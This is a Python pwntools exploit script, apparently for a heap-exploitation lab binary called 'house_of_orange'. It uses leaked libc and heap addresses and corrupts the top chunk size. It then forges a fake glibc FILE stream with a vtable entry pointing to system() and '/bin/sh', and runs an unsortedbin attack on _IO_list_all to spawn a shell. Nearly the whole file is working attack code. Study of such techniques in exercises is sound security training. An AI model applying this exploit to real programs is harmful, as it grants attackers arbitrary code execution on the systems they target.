#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_orange")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc (small)" option.
def small_malloc():
    io.sendthen(b"> ", b"1")

# Select the "malloc (large)" option.
def large_malloc():
    io.sendthen(b"> ", b"2")

# Select the "edit (1st small chunk)" option; send data.
def edit(data):
    io.send(b"3")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request a small chunk.
small_malloc()

# Overwrite top chunk make sure to align with pagesize
edit(b"Y"*24 + p64(0x1000 - 0x20 + 1))

# Make sure to free the top chunk
large_malloc()

# 24 pad + size 0x21 + fd + bk (_IO_LIST_ALL - 16)
# payload = flat(
#   b"A" * 24,
#   p64(0x21),
#   p64(0),
#   p64(libc.sym["_IO_list_all"] - 0x10)
# )

# edit(payload)

# Craft fake file stream

''' Check
  779       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
 ► 782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
   786           && _IO_OVERFLOW (fp, EOF) == EOF)
   787         result = EOF;
1. _mode
2. writeptr
3. writebase
4. wide data
5, vtable pointer
'''

flags = "/bin/sh\x00"
size = 0x61 # because chain at 0x60 small bin
fd = 0xdeadbeef # skipped
bk = libc.sym["_IO_list_all"] - 0x10 # we want to overwrite _IO_list_all

write_base = 0x1
write_ptr = 0x2
mode = 0x0
vtable_ptr = heap + 0xd8
overflow = libc.sym["system"]

offset = 16
fake_file_stream = flat({
 offset: [
  flags,
  p64(size),
  p64(fd),
  p64(bk),
  p64(write_base),
  p64(write_ptr),
  p64(0) * 18,
  p32(mode),
  p32(0),
  p64(0),
  p64(overflow),
  p64(vtable_ptr),
 ]}  
)

info("Len payload: " + str(len(fake_file_stream)))
info("Exp: " + str(0xd8))

edit(fake_file_stream)

# Trigger malloc again for the unsortedbin attack
small_malloc()

# =============================================================================

io.interactive()
